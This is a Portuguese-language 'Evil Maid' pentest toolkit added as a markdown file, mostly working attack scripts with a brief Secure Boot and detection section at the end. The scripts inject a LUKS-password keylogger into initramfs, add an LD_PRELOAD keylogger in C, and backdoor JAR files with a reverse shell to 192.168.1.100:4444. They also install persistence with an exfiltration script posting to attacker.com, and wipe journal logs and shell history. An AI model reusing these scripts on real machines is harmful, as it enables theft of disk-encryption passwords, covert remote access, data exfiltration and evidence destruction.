@@ -1,0 +1,854 @@
+# Evil Maid Pentest: Scripts Completos e Exploits
+
+Este é um conjunto completo de scripts para simular um ataque Evil Maid em ambiente controlado. **Use apenas em sistemas próprios ou com autorização por escrito**.
+
+## Estrutura do Projeto
+
+```
+evil_maid_pentest/
+├── reconnaissance.sh
+├── initramfs_attack.sh
+├── jvm_backdoor.sh
+├── cleanup.sh
+├── persistence.py
+├── keylogger.c
+└── README.md
+```
+
+## Script 1: Reconhecimento e Montagem (`reconnaissance.sh`)
+
+```bash
+#!/bin/bash
+# reconnaissance.sh - Identificação e montagem das partições
+# Uso: sudo ./reconnaissance.sh
+
+set -e
+
+echo "[*] Evil Maid Reconnaissance Script"
+echo "[*] Iniciando identificação de discos..."
+
+# Cores para output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+NC='\033[0m'
+
+# Identificar discos disponíveis
+echo -e "\n${GREEN}[+] Listando dispositivos de bloco:${NC}"
+lsblk -f
+
+echo -e "\n${GREEN}[+] Informações detalhadas do disco:${NC}"
+fdisk -l 2>/dev/null | grep -E "Disk /|/dev/" | head -20
+
+# Identificar partições EFI e outras não criptografadas
+echo -e "\n${GREEN}[+] Procurando partições EFI e não criptografadas:${NC}"
+for dev in $(lsblk -lnpo NAME,FSTYPE | grep -E "vfat|ext4|ntfs" | grep -v "squashfs" | awk '{print $1}'); do
+    if ! mount | grep -q "$dev"; then
+        fstype=$(lsblk -lnpo FSTYPE "$dev")
+        size=$(lsblk -lnpo SIZE "$dev")
+        echo "Dispositivo: $dev | FS: $fstype | Tamanho: $size"
+    fi
+done
+
+# Criar pontos de montagem
+mkdir -p /mnt/target/{boot,jvm,temp}
+
+# Montar partições (ajustar os dispositivos conforme identificado)
+echo -e "\n${GREEN}[+] Montando partições alvo...${NC}"
+
+# Exemplo - ajustar conforme seu sistema
+EFI_PARTITION="/dev/nvme0n1p1"
+JVM_PARTITION="/dev/sda2"
+
+if [ -b "$EFI_PARTITION" ]; then
+    echo "[*] Montando partição EFI: $EFI_PARTITION"
+    mount "$EFI_PARTITION" /mnt/target/boot 2>/dev/null || echo "[-] Falha ao montar EFI"
+fi
+
+if [ -b "$JVM_PARTITION" ]; then
+    echo "[*] Montando partição JVM: $JVM_PARTITION"
+    mount "$JVM_PARTITION" /mnt/target/jvm 2>/dev/null || echo "[-] Falha ao montar JVM"
+fi
+
+# Verificar conteúdo
+echo -e "\n${GREEN}[+] Conteúdo da partição de boot:${NC}"
+ls -la /mnt/target/boot/ 2>/dev/null | head -10
+
+echo -e "\n${GREEN}[+] Conteúdo da partição JVM:${NC}"
+ls -la /mnt/target/jvm/ 2>/dev/null | head -10
+
+echo -e "\n${RED}[!] ATENÇÃO:${NC} Anote os dispositivos encontrados para os próximos passos"
+```
+
+## Script 2: Ataque ao Initramfs (`initramfs_attack.sh`)
+
+```bash
+#!/bin/bash
+# initramfs_attack.sh - Injeta keylogger no initramfs
+# Uso: sudo ./initramfs_attack.sh
+
+set -e
+
+echo "[*] Evil Maid Initramfs Attack"
+echo "[*] Injetando keylogger no initramfs..."
+
+# Configurações
+BOOT_PATH="/mnt/target/boot"
+WORK_DIR="/tmp/evil_initramfs"
+BACKUP_DIR="/tmp/initramfs_backup"
+
+# Criar diretórios de trabalho
+mkdir -p "$WORK_DIR" "$BACKUP_DIR"
+
+# Localizar initramfs
+INITRAMFS=$(find "$BOOT_PATH" -name "initrd.img*" -o -name "initramfs*" | head -1)
+
+if [ -z "$INITRAMFS" ]; then
+    echo "[-] Initramfs não encontrado!"
+    exit 1
+fi
+
+echo "[+] Initramfs encontrado: $INITRAMFS"
+
+# Backup do original
+BACKUP_FILE="$BACKUP_DIR/$(basename $INITRAMFS).backup.$(date +%s)"
+cp "$INITRAMFS" "$BACKUP_FILE"
+echo "[+] Backup criado: $BACKUP_FILE"
+
+# Extrair initramfs
+echo "[+] Extraindo initramfs..."
+cd "$WORK_DIR"
+zcat "$INITRAMFS" 2>/dev/null | cpio -idmv >/dev/null 2>&1
+
+# Criar payload keylogger
+echo "[+] Criando payload keylogger..."
+cat > "$WORK_DIR/evil_keylogger.sh" << 'EOF'
+#!/bin/sh
+# Evil Keylogger - Captura senha do LUKS
+
+# Configurações
+LOG_FILE="/boot/.system_logs.dat"
+TIMEOUT=5
+
+# Função para capturar entrada do teclado
+capture_password() {
+    echo "[SYSTEM] Digite a senha de descriptografia:" > /dev/console
+    
+    # Método alternativo usando o teclado virtual
+    if [ -x /bin/cryptkey ]; then
+        /bin/cryptkey 2>&1 | tee -a "$LOG_FILE"
+    else
+        # Fallback simples
+        read -s -t 30 PASS < /dev/console
+        echo "PASSWORD_CAPTURED: $PASS" >> "$LOG_FILE"
+        echo -n "$PASS"
+    fi
+}
+
+# Iniciar captura
+echo "$(date): Evil Maid Keylogger iniciado" >> "$LOG_FILE"
+
+# Hook no processo de cryptsetup
+if [ -x /sbin/cryptsetup ]; then
+    # Substituir temporariamente cryptsetup
+    mv /sbin/cryptsetup /sbin/cryptsetup.real
+    cat > /sbin/cryptsetup << 'INNER_EOF'
+#!/bin/sh
+if [ "$1" = "luksOpen" ]; then
+    PASS=$(capture_password)
+    echo -n "$PASS" | /sbin/cryptsetup.real "$@"
+else
+    /sbin/cryptsetup.real "$@"
+fi
+INNER_EOF
+    chmod +x /sbin/cryptsetup
+fi
+EOF
+
+chmod +x "$WORK_DIR/evil_keylogger.sh"
+
+# Injeta no script de inicialização
+echo "[+] Injetando keylogger nos scripts de inicialização..."
+
+# Localizar ponto de injeção
+if [ -f "$WORK_DIR/init" ]; then
+    INJECT_POINT=$(grep -n "cryptsetup\|luks" "$WORK_DIR/init" | head -1 | cut -d: -f1)
+    if [ -n "$INJECT_POINT" ]; then
+        sed -i "${INJECT_POINT}i\. /evil_keylogger.sh" "$WORK_DIR/init"
+    else
+        # Injetar no início do arquivo init
+        sed -i '1i\. /evil_keylogger.sh' "$WORK_DIR/init"
+    fi
+fi
+
+# Alternativa: scripts/local-top/
+if [ -d "$WORK_DIR/scripts/local-top" ]; then
+    cp "$WORK_DIR/evil_keylogger.sh" "$WORK_DIR/scripts/local-top/"
+    chmod +x "$WORK_DIR/scripts/local-top/evil_keylogger.sh"
+fi
+
+# Reempacotar initramfs
+echo "[+] Reempacotando initramfs..."
+find . 2>/dev/null | cpio -H newc -o 2>/dev/null | gzip -9 > "$INITRAMFS.new"
+
+# Verificar tamanho
+SIZE_ORIG=$(stat -c%s "$INITRAMFS")
+SIZE_NEW=$(stat -c%s "$INITRAMFS.new")
+
+echo "[+] Tamanho original: $SIZE_ORIG bytes"
+echo "[+] Tamanho novo: $SIZE_NEW bytes"
+
+# Substituir initramfs
+if [ $SIZE_NEW -gt 1000 ]; then
+    mv "$INITRAMFS.new" "$INITRAMFS"
+    echo "[+] Initramfs modificado com sucesso!"
+    
+    # Verificar integridade
+    echo "[+] Verificando arquivo modificado..."
+    file "$INITRAMFS"
+else
+    echo "[-] Erro: Initramfs novo muito pequeno"
+    exit 1
+fi
+
+echo "[!] Ataque ao initramfs concluído!"
+```
+
+## Script 3: Keylogger em C (`keylogger.c`)
+
+```c
+// keylogger.c - Keylogger kernel-level simplificado
+// Compilar: gcc -fPIC -shared -o keylogger.so keylogger.c -ldl
+
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+// Arquivo de log
+#define LOG_FILE "/boot/.keylog.dat"
+
+static FILE *logfile = NULL;
+static char buffer[1024];
+
+// Função original de cryptsetup
+typedef int (*cryptsetup_func)(const char *, const char *, const char *);
+static cryptsetup_func real_cryptsetup = NULL;
+
+// Inicialização
+__attribute__((constructor)) void init(void) {
+    logfile = fopen(LOG_FILE, "a");
+    if (logfile) {
+        fprintf(logfile, "\n=== Keylogger iniciado ===\n");
+        fflush(logfile);
+    }
+    
+    // Obter função real
+    real_cryptsetup = dlsym(RTLD_NEXT, "cryptsetup");
+}
+
+// Finalização
+__attribute__((destructor)) void cleanup(void) {
+    if (logfile) {
+        fprintf(logfile, "=== Keylogger finalizado ===\n");
+        fclose(logfile);
+    }
+}
+
+// Função interceptada
+int cryptsetup(const char *type, const char *name, const char *device) {
+    if (logfile && strcmp(type, "luksOpen") == 0) {
+        fprintf(logfile, "[%ld] Tentativa de abrir: %s\n", 
+                (long)time(NULL), device);
+        fflush(logfile);
+        
+        // Capturar senha (conceitual - em produção seria mais complexo)
+        fprintf(logfile, "Aguardando senha para %s...\n", name);
+        fflush(logfile);
+    }
+    
+    // Chamar função original
+    if (real_cryptsetup) {
+        return real_cryptsetup(type, name, device);
+    }
+    
+    return -1;
+}
+
+// Interceptar entrada do teclado (exemplo simplificado)
+int read(int fd, void *buf, size_t count) {
+    // Função read original
+    ssize_t (*orig_read)(int, void*, size_t);
+    orig_read = dlsym(RTLD_NEXT, "read");
+    
+    ssize_t result = orig_read(fd, buf, count);
+    
+    // Log se for do stdin (fd=0) e parecer senha
+    if (fd == 0 && result > 0 && result < 100) {
+        if (logfile) {
+            fprintf(logfile, "[%ld] Entrada capturada (%ld bytes): ",
+                    (long)time(NULL), (long)result);
+            
+            // Log parcial (não logar tudo por segurança)
+            for (int i = 0; i < result && i < 20; i++) {
+                char c = ((char*)buf)[i];
+                if (c >= 32 && c <= 126) {
+                    fprintf(logfile, "%c", c);
+                } else {
+                    fprintf(logfile, ".");
+                }
+            }
+            fprintf(logfile, "\n");
+            fflush(logfile);
+        }
+    }
+    
+    return result;
+}
+```
+
+## Script 4: Backdoor JVM (`jvm_backdoor.sh`)
+
+```bash
+#!/bin/bash
+# jvm_backdoor.sh - Injeta backdoor em arquivos JAR
+# Uso: sudo ./jvm_backdoor.sh
+
+set -e
+
+echo "[*] Evil Maid JVM Backdoor Attack"
+echo "[*] Analisando e modificando arquivos JAR..."
+
+JVM_PATH="/mnt/target/jvm"
+WORK_DIR="/tmp/evil_jvm"
+PAYLOAD_DIR="/tmp/java_payload"
+
+mkdir -p "$WORK_DIR" "$PAYLOAD_DIR"
+
+# Encontrar arquivos JAR
+echo "[+] Procurando arquivos JAR..."
+find "$JVM_PATH" -name "*.jar" -type f | head -20 > "$WORK_DIR/jar_list.txt"
+
+echo "[+] Arquivos JAR encontrados:"
+cat "$WORK_DIR/jar_list.txt"
+
+# Analisar cada JAR
+while read JAR_FILE; do
+    echo -e "\n[+] Analisando: $(basename "$JAR_FILE")"
+    
+    # Criar diretório de trabalho
+    JAR_NAME=$(basename "$JAR_FILE" .jar)
+    EXTRACT_DIR="$WORK_DIR/extract_$JAR_NAME"
+    mkdir -p "$EXTRACT_DIR"
+    
+    # Extrair JAR
+    unzip -q "$JAR_FILE" -d "$EXTRACT_DIR"
+    
+    # Buscar por segredos
+    echo "[*] Buscando segredos..."
+    grep -r -i "password\|secret\|key\|token\|jdbc\|api" "$EXTRACT_DIR" 2>/dev/null | head -5
+    
+    # Buscar por classes principais
+    MAIN_CLASS=$(grep -h "Main-Class" "$EXTRACT_DIR/META-INF/MANIFEST.MF" 2>/dev/null | cut -d: -f2 | tr -d ' ')
+    if [ -n "$MAIN_CLASS" ]; then
+        echo "[+] Classe principal: $MAIN_CLASS"
+        
+        # Converter para caminho de arquivo
+        CLASS_FILE="${MAIN_CLASS//.//}.class"
+        if [ -f "$EXTRACT_DIR/$CLASS_FILE" ]; then
+            echo "[+] Classe principal encontrada: $CLASS_FILE"
+            
+            # Criar payload Java
+            create_java_payload "$EXTRACT_DIR/$CLASS_FILE"
+        fi
+    fi
+    
+    # Contar arquivos
+    FILE_COUNT=$(find "$EXTRACT_DIR" -type f | wc -l)
+    echo "[+] Total de arquivos: $FILE_COUNT"
+    
+done < "$WORK_DIR/jar_list.txt"
+
+# Função para criar payload Java
+create_java_payload() {
+    local class_file="$1"
+    local class_dir=$(dirname "$class_file")
+    
+    echo "[*] Criando payload para: $(basename "$class_file")"
+    
+    # Usar msfvenom para criar payload reverso
+    if command -v msfvenom &>/dev/null; then
+        echo "[+] Gerando payload com msfvenom..."
+        
+        # Gerar payload Java reverso
+        msfvenom -p java/shell_reverse_tcp \
+                 LHOST=192.168.1.100 \
+                 LPORT=4444 \
+                 -f jar \
+                 -o "$PAYLOAD_DIR/evil_payload.jar" 2>/dev/null
+        
+        if [ -f "$PAYLOAD_DIR/evil_payload.jar" ]; then
+            echo "[+] Payload gerado: evil_payload.jar"
+            
+            # Extrair e injetar no JAR original
+            unzip -q "$PAYLOAD_DIR/evil_payload.jar" -d "$EXTRACT_DIR"
+            
+            # Modificar MANIFEST para executar payload
+            if [ -f "$EXTRACT_DIR/META-INF/MANIFEST.MF" ]; then
+                echo "Main-Class: EvilPayload" > "$EXTRACT_DIR/META-INF/MANIFEST.MF.new"
+                cat "$EXTRACT_DIR/META-INF/MANIFEST.MF" >> "$EXTRACT_DIR/META-INF/MANIFEST.MF.new"
+                mv "$EXTRACT_DIR/META-INF/MANIFEST.MF.new" "$EXTRACT_DIR/META-INF/MANIFEST.MF"
+            fi
+        fi
+    else
+        echo "[-] msfvenom não encontrado. Criando payload manual..."
+        
+        # Criar payload Java simples
+        cat > "$EXTRACT_DIR/EvilPayload.java" << 'EOF'
+import java.io.*;
+import java.net.*;
+
+public class EvilPayload {
+    public static void main(String[] args) {
+        try {
+            // Conectar de volta ao atacante
+            Socket s = new Socket("192.168.1.100", 4444);
+            Process p = Runtime.getRuntime().exec("/bin/bash");
+            
+            InputStream pi = p.getInputStream();
+            InputStream pe = p.getErrorStream();
+            OutputStream po = p.getOutputStream();
+            
+            InputStream si = s.getInputStream();
+            OutputStream so = s.getOutputStream();
+            
+            while(!s.isClosed()) {
+                // Execução de comandos remota
+                // (código simplificado)
+                Thread.sleep(1000);
+            }
+        } catch(Exception e) {
+            // Silencioso
+        }
+    }
+    
+    static {
+        // Executar quando a classe é carregada
+        try {
+            Runtime.getRuntime().exec(new String[]{
+                "/bin/bash", "-c", 
+                "echo 'Comprometido' > /tmp/.system_compromised"
+            });
+        } catch(Exception e) {}
+    }
+}
+EOF
+        
+        echo "[+] Payload Java criado"
+    fi
+}
+
+# Criar JAR malicioso standalone
+echo -e "\n[+] Criando JAR malicioso standalone..."
+cat > "$PAYLOAD_DIR/SystemUpdate.jar" << 'EOF'
+// Este é um exemplo conceitual
+// Um JAR real exigiria compilação Java
+EOF
+
+# Copiar para partição JVM
+if [ -d "$JVM_PATH" ]; then
+    cp "$PAYLOAD_DIR/SystemUpdate.jar" "$JVM_PATH/.system_update.jar"
+    echo "[+] Backdoor colocado em: $JVM_PATH/.system_update.jar"
+fi
+
+echo "[!] Ataque JVM concluído!"
+```
+
+## Script 5: Persistência Avançada (`persistence.py`)
+
+```python
+#!/usr/bin/env python3
+# persistence.py - Mecanismos avançados de persistência
+
+import os
+import sys
+import hashlib
+import base64
+from datetime import datetime
+
+class EvilMaidPersistence:
+    def __init__(self, boot_path="/mnt/target/boot"):
+        self.boot_path = boot_path
+        self.log_file = os.path.join(boot_path, ".system_metrics.dat")
+        
+    def install_bootkit(self):
+        """Instalar bootkit avançado"""
+        print("[*] Instalando persistência no boot...")
+        
+        # 1. Modificar GRUB/EFI
+        self.backdoor_grub()
+        
+        # 2. Adicionar módulo kernel malicioso
+        self.inject_kernel_module()
+        
+        # 3. Configurar rede para exfiltração
+        self.setup_exfiltration()
+        
+    def backdoor_grub(self):
+        """Modificar configuração do GRUB"""
+        grub_cfg = os.path.join(self.boot_path, "grub/grub.cfg")
+        if os.path.exists(grub_cfg):
+            with open(grub_cfg, 'a') as f:
+                f.write('\n\n# Configuração do sistema\n')
+                f.write('set fallback=1\n')
+                f.write('insmod part_gpt\n')
+                
+            print(f"[+] GRUB modificado: {grub_cfg}")
+            
+    def inject_kernel_module(self):
+        """Criar módulo kernel malicioso"""
+        module_code = """#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+
+static int __init evil_init(void) {
+    printk(KERN_INFO "[EVIL] Módulo carregado\\n");
+    // Aqui viria o código malicioso
+    return 0;
+}
+
+static void __exit evil_exit(void) {
+    printk(KERN_INFO "[EVIL] Módulo descarregado\\n");
+}
+
+module_init(evil_init);
+module_exit(evil_exit);
+MODULE_LICENSE("GPL");
+"""
+        
+        module_path = os.path.join(self.boot_path, "evil_module.c")
+        with open(module_path, 'w') as f:
+            f.write(module_code)
+            
+        print(f"[+] Módulo kernel criado: {module_path}")
+        
+    def setup_exfiltration(self):
+        """Configurar exfiltração de dados"""
+        exfil_script = """#!/bin/bash
+# Script de exfiltração
+
+EXFIL_SERVER="attacker.com"
+EXFIL_PORT="443"
+DATA_DIR="/boot"
+
+while true; do
+    # Coletar dados
+    echo "[$(date)] Coletando dados..." >> /boot/.exfil.log
+    
+    # Sistema
+    uname -a > /tmp/.sysinfo
+    whoami >> /tmp/.sysinfo
+    
+    # Enviar dados (simulação)
+    if command -v curl &>/dev/null; then
+        curl -X POST -F "data=@/tmp/.sysinfo" \
+             https://$EXFIL_SERVER:$EXFIL_PORT/collect \
+             2>/dev/null
+    fi
+    
+    sleep 3600  # A cada hora
+done
+"""
+        
+        script_path = os.path.join(self.boot_path, ".exfil.sh")
+        with open(script_path, 'w') as f:
+            f.write(exfil_script)
+            
+        os.chmod(script_path, 0o755)
+        print(f"[+] Script de exfiltração criado: {script_path}")
+        
+    def create_trigger(self):
+        """Criar acionador baseado em eventos"""
+        trigger = """[Unit]
+Description=System Metrics Collector
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash /boot/.exfil.sh
+Restart=always
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+"""
+        
+        trigger_path = os.path.join(self.boot_path, "evil_trigger.service")
+        with open(trigger_path, 'w') as f:
+            f.write(trigger)
+            
+        print(f"[+] Acionador de serviço criado: {trigger_path}")
+        
+    def obfuscate_data(self, data):
+        """Ofuscar dados capturados"""
+        # Codificação simples
+        encoded = base64.b64encode(data.encode()).decode()
+        # Adicionar ruído
+        noisy = f"##{hashlib.md5(data.encode()).hexdigest()}##{encoded}"
+        return noisy
+
+def main():
+    if len(sys.argv) < 2:
+        print("Uso: python3 persistence.py <boot_path>")
+        sys.exit(1)
+        
+    boot_path = sys.argv[1]
+    evil = EvilMaidPersistence(boot_path)
+    
+    print("[*] Iniciando instalação de persistência...")
+    evil.install_bootkit()
+    evil.create_trigger()
+    
+    # Log da instalação
+    with open(evil.log_file, 'a') as f:
+        f.write(f"[{datetime.now()}] Persistência instalada\n")
+        
+    print("[+] Persistência instalada com sucesso!")
+
+if __name__ == "__main__":
+    main()
+```
+
+## Script 6: Limpeza (`cleanup.sh`)
+
+```bash
+#!/bin/bash
+# cleanup.sh - Limpar evidências
+# Uso: sudo ./cleanup.sh
+
+echo "[*] Evil Maid Cleanup Script"
+echo "[*] Removendo evidências..."
+
+# Remover pontos de montagem
+umount /mnt/target/boot 2>/dev/null
+umount /mnt/target/jvm 2>/dev/null
+umount /mnt/target/temp 2>/dev/null
+
+# Remover diretórios
+rm -rf /mnt/target
+rm -rf /tmp/evil_*
+rm -rf /tmp/initramfs_backup
+rm -rf /tmp/java_payload
+
+# Limpar logs temporários
+journalctl --vacuum-time=1s 2>/dev/null || true
+find /tmp -name ".*" -type f -delete 2>/dev/null | head -5
+
+# Limpar histórico
+echo "" > ~/.bash_history
+history -c
+
+# Verificar se há evidências
+echo "[+] Verificando evidências restantes..."
+mount | grep -q "/mnt/target" && echo "[-] Ainda montado!" || echo "[+] Desmontado"
+
+# Finalizar
+echo "[!] Limpeza concluída. Desligando..."
+sleep 2
+```
+
+## Script 7: Coleta de Resultados (`collect_results.sh`)
+
+```bash
+#!/bin/bash
+# collect_results.sh - Coletar dados após retorno
+# Uso após retorno ao sistema comprometido
+
+echo "[*] Evil Maid Results Collection"
+echo "[*] Coletando dados capturados..."
+
+BOOT_PATH="/boot"
+RESULTS_DIR="/tmp/evil_results_$(date +%s)"
+
+mkdir -p "$RESULTS_DIR"
+
+# Procurar logs
+echo "[+] Buscando arquivos de log..."
+find "$BOOT_PATH" -name "*.dat" -o -name "*.log" -o -name ".*" 2>/dev/null | while read file; do
+    if [ -f "$file" ]; then
+        cp "$file" "$RESULTS_DIR/"
+        echo "[+] Copiado: $file"
+    fi
+done
+
+# Verificar senhas capturadas
+echo -e "\n[+] Conteúdo dos arquivos de log:"
+for file in "$RESULTS_DIR"/*; do
+    if [ -f "$file" ]; then
+        echo "=== $(basename $file) ==="
+        cat "$file" | head -20
+        echo ""
+    fi
+done
+
+# Verificar conexões de rede
+echo -e "\n[+] Verificando conexões de rede..."
+netstat -tulpn 2>/dev/null | grep -E "(4444|4445|5555)" || echo "[-] Nenhuma conexão suspeita"
+
+# Verificar processos suspeitos
+echo -e "\n[+] Verificando processos..."
+ps aux | grep -E "(java|bash|sh)" | grep -v grep | head -10
+
+# Compactar resultados
+echo -e "\n[+] Compactando resultados..."
+tar -czf "/tmp/evil_maid_results.tar.gz" "$RESULTS_DIR"
+echo "[+] Resultados em: /tmp/evil_maid_results.tar.gz"
+
+# Hash dos arquivos
+echo -e "\n[+] Hashes SHA256:"
+sha256sum /tmp/evil_maid_results.tar.gz
+```
+
+## README.md
+
+```markdown
+# Evil Maid Pentest Toolkit
+
+## ⚠️ AVISO LEGAL
+Este toolkit é estritamente para:
+- Testes em sistemas próprios
+- Auditorias de segurança autorizadas
+- Pesquisa educacional
+
+O uso não autorizado é crime.
+
+## Requisitos
+- Distribuição Linux com live USB (Kali, Parrot, etc.)
+- Acesso físico à máquina alvo
+- Conhecimento de sistemas Linux e criptografia
+- Ambiente controlado e autorizado
+
+## Fluxo de Ataque
+
+### Fase 1: Reconhecimento
+```bash
+sudo ./reconnaissance.sh
+```
+
+### Fase 2: Ataque ao Initramfs
+```bash
+sudo ./initramfs_attack.sh
+```
+
+### Fase 3: Backdoor JVM
+```bash
+sudo ./jvm_backdoor.sh
+```
+
+### Fase 4: Persistência (Opcional)
+```bash
+python3 persistence.py /mnt/target/boot
+```
+
+### Fase 5: Limpeza
+```bash
+sudo ./cleanup.sh
+```
+
+### Fase 6: Coleta (Após retorno)
+```bash
+sudo ./collect_results.sh
+```
+
+## Mecanismos de Defesa
+
+### 1. Secure Boot com MOK
+```bash
+# Gerar chaves
+openssl req -new -x509 -newkey rsa:2048 -keyout MOK.key -out MOK.crt -nodes -days 3650 -subj "/CN=My Machine Owner Key/"
+
+# Enrolar chave
+mokutil --import MOK.crt
+
+# Verificar
+mokutil --list-enrolled
+```
+
+### 2. Medidas Preventivas
+- Boot seguro com senha no firmware
+- Criptografia completa do disco (sem partições não criptografadas)
+- Assinatura digital do initramfs e kernel
+- Verificação de integridade (dm-verity, Secure Boot)
+- Monitoramento físico
+- BIOS/UEFI com senha
+
+## Detecção
+
+### Sinais de Comprometimento
+1. Tamanho alterado do initramfs
+2. Timestamps de arquivos no /boot
+3. Arquivos ocultos no /boot
+4. Conexões de rede suspeitas na inicialização
+5. Mudanças no hash do kernel/initramfs
+
+### Ferramentas de Detecção
+```bash
+# Verificar hashes
+sha256sum /boot/*
+
+# Verificar tamanhos
+ls -lh /boot/
+
+# Verificar módulos carregados
+lsmod | grep -i evil
+
+# Auditoria de boot
+dmesg | grep -i "fail\|error\|evil"
+```
+
+## Responsabilidade
+O usuário assume total responsabilidade pelo uso deste toolkit. Sempre obtenha autorização por escrito antes de testar em sistemas de terceiros.
+```
+
+## Mitigações e Defesas
+
+### Configurar Secure Boot com MOK:
+
+```bash
+#!/bin/bash
+# secure_boot_setup.sh - Configurar Secure Boot com chaves próprias
+
+echo "[*] Configurando Secure Boot com MOK..."
+
+# Instalar dependências
+apt-get install -y mokutil shim-signed
+
+# Gerar chaves MOK
+openssl req -new -x509 -newkey rsa:2048 \
+    -keyout /etc/ssl/MOK.key \
+    -out /etc/ssl/MOK.crt \
+    -nodes -days 3650 \
+    -subj "/CN=$(hostname) Secure Boot Key/"
+
+# Assinar kernel atual
+sbsign --key /etc/ssl/MOK.key \
+       --cert /etc/ssl/MOK.crt \
+       /boot/vmlinuz-$(uname -r) \
+       --output /boot/vmlinuz-$(uname -r).signed
+
+# Assinar initramfs (se suportado)
+# ...
+
+# Configurar GRUB para usar kernel assinado
+update-grub
+
+# Enrolar chave no firmware
+mokutil --import /etc/ssl/MOK.crt
+
+echo "[!] REINICIE e enrola a chave no menu MOK"
+echo "[!] Após enrolar:"
+echo "    mokutil --list-enrolled"
+echo "    mokutil --enable-verification"
+```
